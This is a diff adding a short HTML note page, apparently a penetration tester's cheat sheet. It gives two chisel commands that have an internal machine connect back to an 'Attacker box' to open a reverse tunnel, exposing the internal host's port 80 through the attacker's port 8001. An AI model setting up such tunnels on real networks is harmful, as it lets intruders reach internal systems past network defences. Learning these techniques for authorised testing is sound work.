@@ -1,0 +1,13 @@
+<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
+<html xmlns="http://www.w3.org/1999/xhtml">
+<head>
+<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
+<title>Reverse</title>
+</head><body>Attacker box# chisel server -p 8000 -reverse<br/>
+Internal box# chisel client &lt;Attacker box&gt;:8000 R:8001:&lt;Internal box&gt;:80<br/>
+<br/>
+This will let the attacker gain access to port 80 on the internal box by browsing to attacker port 8001 using port 8000 as the tunnel<br/>
+<br/>
+<img src="image.png" /><br/>
+<br/>
+</body></html>
